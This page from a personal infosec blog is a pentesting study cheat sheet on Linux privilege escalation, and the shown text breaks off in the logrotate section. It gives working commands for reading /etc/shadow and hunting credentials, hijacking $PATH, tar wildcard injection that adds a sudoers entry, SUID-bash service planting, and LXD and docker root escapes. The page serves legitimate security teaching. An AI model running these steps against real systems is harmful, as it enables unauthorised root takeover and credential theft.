<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>ovelny - chaos/linux-exploitation/privilege-escalation</title>
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta
      name="description"
      content="ovelny - notes on infosec, penetration testing, programming and others"
    />
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="stylesheet" type=text/css href="/assets/css/dead-simple.min.css">
    <link rel="stylesheet" type=text/css href="/assets/css/rouge.min.css">
    <link
      href="/atom.xml"
      rel="alternate"
      title="ovelny"
      type="application/atom+xml"
    />
    <script src="/assets/js/scramble-text.min.js" defer></script>
    <script src="/assets/js/zoom-images.min.js" defer></script>
    <meta name="twitter:card" content="summary"/>
    <meta name="twitter:site" content="@ovelny"/>
    <meta name="twitter:title" content="ovelny - chaos/linux-exploitation/privilege-escalation"/>
    <meta name="twitter:image" content="https://ovelny.sh/assets/images/ovelny-logo.png"/>
    <meta name="twitter:image:alt" content="ovelny logo: 6 white circles grouped together forming a triangle shape, with a black background."/>
  </head>
  <body>

    <header>
      <section>
        <a href="/">
          <img
            class="logo"
            src="/assets/images/ovelny-pfp.png"
            alt="ovelny profile picture: a glitched picture of a three-eyed girl, staring intensely at the viewer."
          />
        </a>
        <h2><a class="ovelny" href="/">ovelny</a></h2>
      </section>
      <nav>
        <a href="/">home</a>
        <a href="/chaos/">chaos</a>
        <a href="/phasm/">phasm</a>
        <a href="/support/">support</a>
        <a href="/atom.xml" target="_blank" rel="noopener noreferrer">rss</a>
        <a href="/about/">about</a>
      </nav>
    </header>
    <main>

    
    <h1>Privilege escalation</h1>

<p>We often gain a low-privileged foothold on our targets at first: we need to perform privilege escalation through various means to get access to the root account. This document aims to gather every aspect related to this part of an assessment.</p>

<h2>Enumeration</h2>

<p>As with everything in pentesting, enumeration is key. It&#39;s good to know our way around tools like <a href="https://github.com/rebootuser/LinEnum" rel="nofollow">LinEnum</a>, but manual enumeration and knowing what to look for remains irreplaceable.</p>

<p>Here&#39;s a non-exhaustive list of things to look for:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Current running processes (users and root):</span>
ps aux | <span class="nb">grep </span>root
ps au

<span class="c"># Home directory contents.</span>
<span class="c"># SSH keys:</span>
<span class="nb">ls</span> <span class="nt">-la</span>  /home/&lt;username&gt;
<span class="nb">ls</span> <span class="nt">-l</span> ~/.ssh
<span class="c"># Bash history:</span>
<span class="nb">cat</span> ~/.bash_history

<span class="c"># Current user's privileges:</span>
<span class="nb">sudo</span> <span class="nt">-l</span>

<span class="c"># Configuration files:</span>
find ~/ <span class="nt">-type</span> f <span class="nt">-iname</span> <span class="s1">'*.conf'</span> <span class="nt">-o</span> <span class="nt">-iname</span> <span class="s2">"*.config"</span>

<span class="c"># /etc/passwd and /etc/shadow:</span>
<span class="nb">cat</span> /etc/passwd
<span class="nb">cat</span> /etc/shadow

<span class="c"># Cron jobs:</span>
<span class="nb">ls</span> <span class="nt">-la</span> /etc/cron.<span class="k">*</span>/

<span class="c"># File systems and additional drives:</span>
lsblk
<span class="nb">df</span> <span class="nt">-h</span>

<span class="c"># Writeable directories and files:</span>
find / <span class="nt">-path</span> /proc <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-type</span> d <span class="nt">-perm</span> <span class="nt">-o</span>+w 2&gt;/dev/null
find / <span class="nt">-path</span> /proc <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-o</span>+w 2&gt;/dev/null
</code></pre></div>

<h3>Enumerating the environment</h3>

<p>Knowing the OS version, kernel version, and running services can help escalating our privileges depending on related CVEs, distribution in use, etc. A misconfigured service running as root can also be our key for further exploitation.</p>

<p>Typically, we first want to answer the following questions with related commands:</p>

<ul>
<li><code>whoami</code>: self-explanatory.</li>
<li><code>id</code>: what groups is our user part of?</li>
<li><code>hostname</code>: what&#39;s the name of the server? Do we get any clues for the naming convention?</li>
<li><code>ifconfig</code> or <code>ip a</code>: what is our current subnet, and which additional interfaces are present?</li>
<li><code>sudo -l</code>: can our user run anything with sudo?</li>
</ul>

<p>Next, we must enumerate the environment:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Check the OS and version of our target:</span>
<span class="nb">cat</span> /etc/os-release

<span class="c"># Check the $PATH of our current user:</span>
<span class="nb">echo</span> <span class="nv">$PATH</span>

<span class="c"># Check the environment variables of our current user:</span>
<span class="nb">env</span>

<span class="c"># Check the kernel version on current target:</span>
<span class="nb">uname</span> <span class="nt">-a</span>

<span class="c"># List login shells, in case tmux or screen are available:</span>
<span class="nb">cat</span> /etc/shells

<span class="c"># List block devices on system, for possible</span>
<span class="c"># unmounted drives or filesystems:</span>
lsblk

<span class="c"># Find printers linked to current target:</span>
lpstat

<span class="c"># Find mounted and unmounted drives:</span>
<span class="nb">cat</span> /etc/fstab

<span class="c"># Check other networks available from target:</span>
route
netstat <span class="nt">-rn</span>

<span class="c"># If we're in a domain environment, check internal DNS:</span>
<span class="nb">cat</span> /etc/resolv.conf

<span class="c"># Check ARP table to see other hosts our target communicated with:</span>
arp <span class="nt">-a</span>

<span class="c"># List existing users, and users created for applications and services.</span>
<span class="c"># We might also see a password hash directly available in the file,</span>
<span class="c"># refer to most common hashing algorithms here:</span>
<span class="c"># https://ovelny.sh/chaos/linux-exploitation/linux-cheatsheet/</span>
<span class="nb">cat</span> /etc/passwd

<span class="c"># List existing groups and which users belong to them:</span>
<span class="nb">cat</span> /etc/group

<span class="c"># List members of a specific group:</span>
getent group &lt;group name&gt;

<span class="c"># List all users with a directory under /home.</span>
<span class="c"># If any of these directories are accessible, check</span>
<span class="c"># for SSH keys and ~/.bash_history content, among</span>
<span class="c"># other things:</span>
<span class="nb">ls</span> /home

<span class="c"># List mounted filesystems:</span>
<span class="nb">df</span> <span class="nt">-h</span>

<span class="c"># List unmounted filesystems:</span>
<span class="nb">cat</span> /etc/fstab | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"#"</span> | column <span class="nt">-t</span>

<span class="c"># List all hidden files on system for any user:</span>
find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">".*"</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null | <span class="nb">grep</span> &lt;username&gt;

<span class="c"># List all hidden directories:</span>
find / <span class="nt">-type</span> d <span class="nt">-name</span> <span class="s2">".*"</span> <span class="nt">-ls</span> 2&gt;/dev/null

<span class="c"># List temporary files.</span>
<span class="c"># Files under /var/tmp are kept for up to 30 days by default.</span>
<span class="c"># File under /tmp are kept for up to 10 days, or deleted on reboot:</span>
<span class="nb">ls</span> <span class="nt">-l</span> /tmp /var/tmp /dev/shm
</code></pre></div>

<h3>Enumerating services and internals</h3>

<p>A good next step is to start enumerating the services, applications and internals of the OS. We want to know which services are running, which users are on the system, which sockets are opened and so on. Network information is also crucial to see our potential for pivoting:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># List network interfaces:</span>
ip a

<span class="c"># Check hosts file:</span>
<span class="nb">cat</span> /etc/hosts

<span class="c"># List users' last login:</span>
lastlog

<span class="c"># Check who might be logged in with us:</span>
w 

<span class="c"># Check command history of current user:</span>
<span class="nb">history</span>

<span class="c"># Find for possible history files:</span>
find / <span class="nt">-type</span> f <span class="se">\(</span> <span class="nt">-name</span> <span class="k">*</span>_hist <span class="nt">-o</span> <span class="nt">-name</span> <span class="k">*</span>_history <span class="se">\)</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null

<span class="c"># Check for cron jobs on system:</span>
<span class="nb">ls</span> <span class="nt">-la</span> /etc/cron.<span class="k">*</span>

<span class="c"># Check for interesting strings in /proc/cmdline:</span>
find /proc <span class="nt">-name</span> cmdline <span class="nt">-exec</span> <span class="nb">cat</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null | <span class="nb">tr</span> <span class="s2">" "</span> <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span>

<span class="c"># Check for old installed packages.</span>
<span class="c"># First, we gather all installed packages:</span>
apt list <span class="nt">--installed</span> | <span class="nb">tr</span> <span class="s2">"/"</span> <span class="s2">" "</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s2">" "</span> <span class="nt">-f1</span>,3 | <span class="nb">sed</span> <span class="s1">'s/[0-9]://g'</span> | <span class="nb">tee</span> <span class="nt">-a</span> installed_pkgs.list
<span class="c"># Next, we compare them against GTFObins for</span>
<span class="c"># possible privilege escalation paths:</span>
<span class="k">for </span>i <span class="k">in</span> <span class="si">$(</span>curl <span class="nt">-s</span> https://gtfobins.github.io/ | html2text | <span class="nb">cut</span> <span class="nt">-d</span><span class="s2">" "</span> <span class="nt">-f1</span> | <span class="nb">sed</span> <span class="s1">'/^[[:space:]]*$/d'</span><span class="si">)</span><span class="p">;</span><span class="k">do if </span><span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"</span><span class="nv">$i</span><span class="s2">"</span> installed_pkgs.list<span class="p">;</span><span class="k">then </span><span class="nb">echo</span> <span class="s2">"Check GTFO for: </span><span class="nv">$i</span><span class="s2">"</span><span class="p">;</span><span class="k">fi</span><span class="p">;</span><span class="k">done</span>

<span class="c"># Check sudo version in case it's vulnerable to some exploits:</span>
<span class="nb">sudo</span> <span class="nt">-V</span>

<span class="c"># Check binaries on system:</span>
<span class="nb">ls</span> <span class="nt">-l</span> /bin /usr/bin/ /usr/sbin/

<span class="c"># Track system calls and signal processing</span>
<span class="c"># with strace. Example use:</span>
strace netstat <span class="nt">-tulpen</span>

<span class="c"># Find configuration files that might</span>
<span class="c"># hold sensitive information:</span>
find / <span class="nt">-type</span> f <span class="se">\(</span> <span class="nt">-name</span> <span class="k">*</span>.conf <span class="nt">-o</span> <span class="nt">-name</span> <span class="k">*</span>.config <span class="se">\)</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-l</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null

<span class="c"># Find scripts:</span>
find / <span class="nt">-type</span> f <span class="nt">-name</span> <span class="s2">"*.sh"</span> 2&gt;/dev/null | <span class="nb">grep</span> <span class="nt">-v</span> <span class="s2">"src</span><span class="se">\|</span><span class="s2">snap</span><span class="se">\|</span><span class="s2">share"</span>

<span class="c"># List running services by user:</span>
ps aux | <span class="nb">grep </span>root
</code></pre></div>

<h3>Hunting for credentials</h3>

<p>Checking for credentials in configuration files, scripts and other types of files is an unmissible step, too. Check the <a href="https://ovelny.sh/chaos/linux-exploitation/credential-hunting/" rel="nofollow">related page</a> for more one-liners and places to hunt.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Check for MySQL database credentials</span>
<span class="c"># in wp-config.php. Check /var directory</span>
<span class="c"># to find its most likely path:</span>
<span class="nb">cat </span>wp-config.php | <span class="nb">grep</span> <span class="s1">'DB_USER\|DB_PASSWORD'</span>

<span class="c"># Check for config files (nearly) everywhere:</span>
find / <span class="o">!</span> <span class="nt">-path</span> <span class="s2">"*/proc/*"</span> <span class="nt">-iname</span> <span class="s2">"*config*"</span> <span class="nt">-type</span> f 2&gt;/dev/null

<span class="c"># Check for SSH keys:</span>
<span class="nb">ls</span> <span class="nt">-la</span> ~/.ssh

<span class="c"># Check for known_hosts file, which</span>
<span class="c"># lists all hosts our user has connected to:</span>
<span class="nb">cat</span> ~/.ssh/known_hosts
</code></pre></div>

<h2>Escalating privileges with the environment</h2>

<h3>Leveraging $PATH</h3>

<p>The <code>$PATH</code> variable is an environment variable listing a set of directories containing executables. This is what allows us to run binaries without specifying its full path, i.e. <code>ls</code> instead of <code>/bin/ls</code>.</p>

<p>We can check the contents of the <code>$PATH</code> variable with either <code>env | grep PATH</code> or <code>echo $PATH</code>. </p>

<p>If we can tamper with the variable, we can add the current working directory to the list and make a user or service run a malicious script instead of the intended binary. A basic example would be:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nv">PATH</span><span class="o">=</span>.:<span class="k">${</span><span class="nv">PATH</span><span class="k">}</span> <span class="c"># Add current working directory to $PATH.</span>
<span class="nb">touch ls</span> <span class="c"># Create 'ls' file in current working directory.</span>
<span class="nb">echo</span> <span class="s1">'echo "hacky!"'</span> <span class="o">&gt;</span> <span class="nb">ls</span> <span class="c"># Our ls script will simply echo "hacky!".</span>
<span class="nb">ls</span> <span class="c"># The executed binary is no longer /bin/ls, but our own script.</span>
</code></pre></div>

<h3>Leveraging wildcards</h3>

<p>Wildcards can be used in most standard commands to substitute a set of characters. The most common wildcards are the following:</p>

<table><thead>
<tr>
<th>Character</th>
<th>Description</th>
</tr>
</thead><tbody>
<tr>
<td>*</td>
<td>Match any number of characters.</td>
</tr>
<tr>
<td>?</td>
<td>Match a single character.</td>
</tr>
<tr>
<td>[abc]</td>
<td>Match any single character at its defined position.</td>
</tr>
<tr>
<td>~</td>
<td>Expand the name of the user home directory (similar as $HOME).</td>
</tr>
<tr>
<td>[a-z]</td>
<td>Denote a range of characters.</td>
</tr>
</tbody></table>

<p>If wildcards are used in a cron job call, we can leverage them to our advantage. Let&#39;s consider the following tar command, set to run every minute:</p>

<div class="highlight"><pre class="highlight plaintext"><code>mh dom mon dow command
*/01 * * * * cd /home/hacky &amp;&amp; tar -zcf /home/hacky/backup.tar.gz *
</code></pre></div>

<p>Because this command will select any file in <code>/home/hacky</code> through the <code>*</code> wildcard, we can add files that will act as arguments and argument parameters to the <code>tar</code> command. It won&#39;t make the distinction between files and args in the slightest!</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Create script that will add hacky user to the sudoers file:</span>
<span class="nb">echo</span> <span class="s1">'echo "hacky ALL=(root) NOPASSWD: ALL" &gt;&gt; /etc/sudoers'</span> <span class="o">&gt;</span> /home/hacky/evil.sh

<span class="c"># Create empty files acting as args for tar:</span>
<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> /home/hacky/<span class="s2">"--checkpoint-action=exec=sh evil.sh"</span>
<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> /home/hacky/--checkpoint<span class="o">=</span>1
</code></pre></div>

<p>The executed tar command will now be <code>tar -zcf /home/hacky/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=sh evil.sh</code>, adding our payload as root. I love this. So stupid and efficient.</p>

<h3>Escaping restricted shells</h3>

<p>Restricted shells are sometimes set up for some users and run only a specific set of commands, to avoid any potential accident. Here&#39;s a few of them:</p>

<table><thead>
<tr>
<th>Restricted shell</th>
<th>Description</th>
</tr>
</thead><tbody>
<tr>
<td>Rbash</td>
<td>Restricted bourne shell.</td>
</tr>
<tr>
<td>Rksh</td>
<td>Restricted korn shell.</td>
</tr>
<tr>
<td>Rzsh</td>
<td>Restricted Z shell.</td>
</tr>
</tbody></table>

<p>If we end up in one of those shells, we can still manage to escape them, either with already known vulnerabilities or some maneuver to bypass them. For instance, if we are restricted to use the <code>ls</code> command, we might still use the output of other commands through it, such as:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="nb">ls</span> <span class="nt">-la</span> <span class="sb">`</span><span class="nb">pwd</span><span class="sb">`</span>
</code></pre></div>

<p>Other maneuvers include:</p>

<ul>
<li>Command substitution: essentially escaping enclosed commands, in backticks for instance.</li>
<li>Command chaining: executing unrestricted commands by chaining them with allowed ones, using <code>;</code>, <code>|</code> and so on.</li>
<li>Environment variables: escaping a restricted shell by modifying env variables&#39; values.</li>
<li>Shell functions: leveraging shell functions to execute unrestricted commands.</li>
</ul>

<p>A few other tricks:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Alternative to env command:</span>
<span class="nb">echo</span> <span class="nv">$0</span>
<span class="nb">echo</span> <span class="nv">$PATH</span>

<span class="c"># Alternative to ls:</span>
<span class="nb">echo</span> <span class="k">*</span>

<span class="c"># List exported variables:</span>
<span class="nb">export</span> <span class="nt">-p</span>

<span class="c"># Execute a command before the restricted</span>
<span class="c"># shell is loaded:</span>
ssh &lt;userame&gt;@&lt;target IP&gt; <span class="nt">-t</span> <span class="s2">"bash"</span>
</code></pre></div>

<h2>Escalating privileges with permissions</h2>

<h3>Leveraging special permissions</h3>

<p>Another way to escalate our privileges is to find programs with the setuid (Set User ID upon Execution) permission set. This allows to execute a program with the permissions of another user, typically with elevated privileges. If the program in question can be reverse engineered or can spawn a shell / send commands in any creative way, we might become root quite quickly.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Find programs owned by root with setuid permission set:</span>
find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-4000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</code></pre></div>

<p>The setgid permission can be leveraged in the same way, as it allows us to use programs as if we were part of the group that created them.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Find programs owned by root with setgid permission set:</span>
find / <span class="nt">-user</span> root <span class="nt">-perm</span> <span class="nt">-6000</span> <span class="nt">-exec</span> <span class="nb">ls</span> <span class="nt">-ldb</span> <span class="o">{}</span> <span class="se">\;</span> 2&gt;/dev/null
</code></pre></div>

<p><a href="https://gtfobins.github.io/" rel="nofollow">GTFOBins</a> is the ideal resource to find ways to leverage programs and binaries with those permission bits set.</p>

<h3>Leveraging sudo privileges</h3>

<p>An account can be granted sudo privileges. Depending on those, we might be able to leverage them to get a root shell. Sudo privileges are set in <code>/etc/sudoers</code>.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Check sudo privileges of current user.</span>
<span class="c"># We might need the user's password but</span>
<span class="c"># NOPASSWD entries can still be seen</span>
<span class="c"># without entering anything:</span>
<span class="nb">sudo</span> <span class="nt">-l</span>
</code></pre></div>

<p>Even a single application allowed to run as root without password can be our key to privilege escalation. For instance, if <code>tcpdump</code> is run as root, the <code>-z</code> can allow us to run an external program, which will also be run with the same privileges. This program could be anything, like a reverse shell of our own:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Run our payload (/tmp/hacky) with the postrotate-command,</span>
<span class="c"># using the -z flag:</span>
<span class="nb">sudo </span>tcpdump <span class="nt">-ln</span> <span class="nt">-i</span> eth0 <span class="nt">-w</span> /dev/null <span class="nt">-W</span> 1 <span class="nt">-G</span> 1 <span class="nt">-z</span> /tmp/hacky <span class="nt">-Z</span> root
</code></pre></div>

<p>As always, <a href="https://gtfobins.github.io/" rel="nofollow">GTFOBins</a> is invaluable to find ways to leverage sudo rights on many programs.</p>

<p>It&#39;s also worth nothing that any command allowed to run as root in <code>/etc/suoders</code> must be specified with its absolute path. Otherwise, we could just leverage <code>$PATH</code> like described above, and create our own version of <code>ls</code>, <code>cat</code>, etc, that would run as root and do something else entirely.</p>

<p>If we have sudo privileges with <code>reboot</code> or <code>shutdown</code> commands, we can also leverage them. With <code>reboot</code>, we need to find writable service first:</p>

<div class="highlight"><pre class="highlight shell"><code>find / <span class="nt">-writable</span> <span class="nt">-name</span> <span class="s2">"*.service"</span> 2&gt;/dev/null
</code></pre></div>

<p>If we do find a service we can edit, say <code>/etc/systemd/systm/exec.service</code>, we can modify it with the following:</p>

<div class="highlight"><pre class="highlight systemd"><code><span class="k">[Unit]</span>
<span class="nt">Description</span><span class="p">=</span>Exec service

<span class="k">[Service]</span>
<span class="nt">Type</span><span class="p">=</span>simple
<span class="nt">User</span><span class="p">=</span>root
<span class="nt">ExecStart</span><span class="p">=</span>/bin/bash -c 'cp /bin/bash /home/&lt;username&gt;/bash; chmod +xs /home/&lt;username&gt;/bash'

<span class="k">[Install]</span>
<span class="nt">WantedBy</span><span class="p">=</span>multi-user.target
</code></pre></div>

<p>Reboot the system as root, and use our modified bash to get a root shell:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Reboot:</span>
<span class="nb">sudo</span> /usr/sbin/reboot
<span class="c"># Once the system is back up, run the modified bash binary:</span>
/home/&lt;username&gt;/bash <span class="nt">-p</span>
</code></pre></div>

<p>With <code>shutdown</code>, we can overwrite the path of <code>poweroff</code> to escalate our privileges:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Create a fake poweroff binary that invokes a shell.</span>
<span class="c"># Use /bin/bash or another shell if necessary:</span>
<span class="nb">echo</span> /bin/sh <span class="o">&gt;</span> /tmp/poweroff

<span class="c"># Change permissions of file and</span>
<span class="c"># add /tmp directory to $PATH:</span>
<span class="nb">chmod</span> +x /tmp/poweroff
<span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>

<span class="c"># Execute shutdown as root, and gain a root shell:</span>
<span class="nb">sudo</span> /usr/sbin/shutdown
</code></pre></div>

<h3>Leveraging privileged groups</h3>

<p>LXC / LXD is Ubuntu&#39;s container manager, similar to Docker in many aspects. All users are added to the LXD group during installation. If the user we control is currently in this group, we might be able to escalate our privileges by creating a LXD container, make it privileged, and access the host&#39;s file system at /mnt/root. </p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Check if our user is currently in LXD group:</span>
<span class="nb">id</span>

<span class="c"># If we are, start LXD initialization process</span>
<span class="c"># and select all defaults:</span>
lxd init

<span class="c"># Import a local image, such as alpine linux:</span>
lxc image import alpine.tar.gz alpine.tar.gz.root <span class="nt">--alias</span> alpine

<span class="c"># Start a privileged container without UID mapping,</span>
<span class="c"># which will effectively make the container's root</span>
<span class="c"># user the same as the host's root user:</span>
lxc init alpine hacky <span class="nt">-c</span> security.privileged<span class="o">=</span><span class="nb">true</span>

<span class="c"># Mount the host file system:</span>
lxc config device add hacky mydev disk <span class="nb">source</span><span class="o">=</span>/ <span class="nv">path</span><span class="o">=</span>/mnt/root <span class="nv">recursive</span><span class="o">=</span><span class="nb">true</span>

<span class="c"># Start the container and spawn a shell inside it:</span>
lxc start hacky
lxc <span class="nb">exec </span>hacky /bin/sh

<span class="c"># Browse the root directory of the host's file system.</span>
<span class="c"># Enjoy doing everything as root:</span>
<span class="nb">cd</span> /mnt/root/root
</code></pre></div>

<p>If our target uses docker, being part of the <code>docker</code> group can also grant us root level access. We could run <code>docker run -v /root:/mnt -it ubuntu</code> and start browsing the host&#39;s root directory through it, just like that.</p>

<p>Another privileged group is the <code>disk</code> group: if we control a member of this group, we can access any devices in <code>/dev</code>, and use <code>debugfs</code> to gain root privileges, gaining similar access described earlier.</p>

<p>Another privileged group is <code>adm</code>: while it doesn&#39;t grant anything like root access, being a member enables us to read all logs stored in <code>/var/log</code>, which might reveal sensitive data and additional privilege escalation paths.</p>

<h3>Leveraging Linux capabilities</h3>

<p>Linux can grant certain privileges to processes, enabling them to perform actions that would otherwise be restricted. This allows for fine-grained control over sensitive privileges, but can also be leveraged to our advantage if a binary gets excessive privileges. The command to set such privileges is usually <code>setcap</code>. For instance, a sysadmin could enable vim to bind network ports with <code>sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</code>.</p>

<table><thead>
<tr>
<th>Capability</th>
<th>Description</th>
</tr>
</thead><tbody>
<tr>
<td>cap_sys_admin</td>
<td>Perform actions with admin privileges.</td>
</tr>
<tr>
<td>cap_sys_chroot</td>
<td>Change the root directory for the current process.</td>
</tr>
<tr>
<td>cap_sys_ptrace</td>
<td>Attach to and debug other processes.</td>
</tr>
<tr>
<td>cap_sys_nice</td>
<td>Raise or lower the priority of processes.</td>
</tr>
<tr>
<td>cap_sys_time</td>
<td>Modify the system clock.</td>
</tr>
<tr>
<td>cap_sys_resource</td>
<td>Modify system resource limits.</td>
</tr>
<tr>
<td>cap_sys_module</td>
<td>Load and unload kernel modules.</td>
</tr>
<tr>
<td>cap_net_bind_service</td>
<td>Bind to network ports.</td>
</tr>
<tr>
<td>cap_setuid</td>
<td>Allow a process to set its user ID, including root.</td>
</tr>
<tr>
<td>cap_setgid</td>
<td>Allow a process to set its group ID, including root.</td>
</tr>
<tr>
<td>cap_sys_admin</td>
<td>Provide many administrative privileges.</td>
</tr>
<tr>
<td>cap_dac_override</td>
<td>Bypass read, write and execute permissions checks.</td>
</tr>
</tbody></table>

<p>To set capabilities like shown above, we need to specify the value we want to assign to the desired capability. Those values depend on the capability we&#39;re aiming for and the privileges we want to grant to the binary. Here are a few of them:</p>

<table><thead>
<tr>
<th>Capability value</th>
<th>Description</th>
</tr>
</thead><tbody>
<tr>
<td>=</td>
<td>Set the capability to the binary without any privileges.</td>
</tr>
<tr>
<td>+ep</td>
<td>Grant the effective and permitted privileges of the capacity.</td>
</tr>
<tr>
<td>+ei</td>
<td>Grant the sufficient and inheritable privileges of the capacity.</td>
</tr>
<tr>
<td>+p</td>
<td>Grant the permitted privileges of the capacity.</td>
</tr>
</tbody></table>

<p>Inheritable privileges also grant the specified capacity to child processes spawned by the binary.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Enumerate capabilities on our target:</span>
find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin <span class="nt">-type</span> f <span class="nt">-exec</span> getcap <span class="o">{}</span> <span class="se">\;</span>
</code></pre></div>

<p>A simple example of privilege escalation leveraging capabilities would be if a text editor had <code>cap_dac_override</code> set. It would then be able to edit any files no matter the restrictions in place, including <code>/etc/password</code> for instance.</p>

<p>We can find more complex and detailed examples <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities" rel="nofollow">here</a>.</p>

<h2>Escalating privileges with services</h2>

<h3>Leveraging vulnerable services</h3>

<p>Some services on our target simply might have known vulnerabilities. Check their versions and use <code>searchsploit</code> to potentially leverage them with some PoCs. GNU Screen version 4.5.0 for instance is a well-known vulnerability to escalate privileges.</p>

<h3>Leveraging cron jobs</h3>

<p>Cron jobs might be misconfigured and allow us to escalate our privileges. For instance, if a world writeable script is ran as root, we might edit it to add a reverse shell at the end of it, or any other payload. Of course, we should keep an original copy of the script first if we&#39;re going that way.</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># Find all writeable files or directories</span>
<span class="c"># used by potential cronjobs:</span>
find / <span class="nt">-path</span> /proc <span class="nt">-prune</span> <span class="nt">-o</span> <span class="nt">-type</span> f <span class="nt">-perm</span> <span class="nt">-o</span>+w 2&gt;/dev/null

<span class="c"># Confirm that a cron job is running with pspy, no root needed.</span>
<span class="c"># -pf is used to print commands and file system events,</span>
<span class="c"># -i 1000 will scan procfs every second:</span>
./pspy64 <span class="nt">-pf</span> <span class="nt">-i</span> 1000
</code></pre></div>

<h3>Leveraging containers</h3>

<p>Say hello again to LXC/LXD. If we are members of either <code>lxc</code> or <code>lxd</code> groups, we can leverage root access as described in the privileged groups section.</p>

<p>With docker, unusual shared directories can make a link between a docker container and the host. It&#39;s worth enumerating to potentially discover access to sensitive files from the host, like the <code>~/.ssh</code> directory of another user.</p>

<p>Docker sockets might allow us to communicate with the docker daemon. If we are allowed to, we can leverage this privileged access to mount parts of the filesystem of the underlying host to the running container, with <code>-v /:/host</code> to read it. We can also mount the device disk with additional privileges, using <code>--device=/dev/sda1 --cap-add=SYS_ADMIN --security-opt apparmor=unconfined</code> followed by <code>mount /dev/sda1 /mnt</code> in the container.</p>

<p>The Docker socket, which carries communication with the Docker daemon, might also be useful to us. It is restricted to specific users and groups, but if we are part of one, we can carry requests directly to the Docker daemon. For that, we need to have the <code>docker</code> binary downloaded somewhere, and we can then use command like this:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># List running containers:</span>
/tmp/docker <span class="nt">-H</span> unix:///app/docker.sock &lt;docker <span class="nb">command</span><span class="o">&gt;</span>

<span class="c"># Map the host's root directory to our /hostsystem directory</span>
<span class="c"># on our container:</span>
/tmp/docker <span class="nt">-H</span> unix:///app/docker.sock run <span class="nt">--rm</span> <span class="nt">-d</span> <span class="nt">--privileged</span> <span class="nt">-v</span> /:/hostsystem main_app

<span class="c"># Log to the privileged Docker container we created:</span>
/tmp/docker <span class="nt">-H</span> unix:///app/docker.sock <span class="nb">exec</span> <span class="nt">-it</span> &lt;docker container ID&gt; /bin/bash
</code></pre></div>

<p>To use Docker with our initial user, we need either of the following:</p>

<ul>
<li>Be part of the <code>docker</code> group.</li>
<li>Have the docker binary set with the SUID bit.</li>
<li>Be in the sudoers file / able to use sudo.</li>
</ul>

<p>Other useful commands include:</p>

<div class="highlight"><pre class="highlight shell"><code><span class="c"># List existing and accessible images:</span>
docker image <span class="nb">ls</span>

<span class="c"># Escalate our privileges as described earlier,</span>
<span class="c"># with the Docker socket:</span>
docker <span class="nt">-H</span> unix:///var/run/docker.sock run <span class="nt">-v</span> /:/mnt <span class="nt">--rm</span> <span class="nt">-it</span> ubuntu <span class="nb">chroot</span> /mnt bash
</code></pre></div>

<h3>Leveraging kubernetes</h3>

<p>To be added. Not exactly part of what I must study so far.</p>

<h3>Leveraging logrotate</h3>

<p>Log files are big and frequently updated on any Linux system: left unchecked, they can quickly fill up all remaining disk space. Logrotate automates the management of log files, particularly their archival and/or deletion under certain conditions. The rotation it usually refers to consists of renaming old log files.</p>

<p>The configuration for logrotate can be found in <code>/etc/logrotate.conf</code>. We can also force a rotation by editing or adding dates in <code>/var/lib/logrotate/status</code> for any log file. Corresponding configuration for each log file can be found in <code>/etc/logrotate.d/</code>.</p>

<p>So how do we leverage logrotate? We need the following requirements for privilege escalation:</p>

<ul>
<li>Having write permissions on the log files.</li>
<li>Logrotate running as root or privileged user.</li>
<li>Logrotate version being either <code>3.8.6</code>, <code>3.11.0</code>, <code>3.15.0</code> or <code>3.18.0</code>.</li>
</ul>

<p>If they are met, we can use use <a href="https://github.com/whotwagner/logrotten" rel="nofollow">logrotten</a> to escalate our privileges. It needs to be compiled on a kernel similar to our target, or directly on the target itself. It exploits a race condition that we can use in the following way:</p>

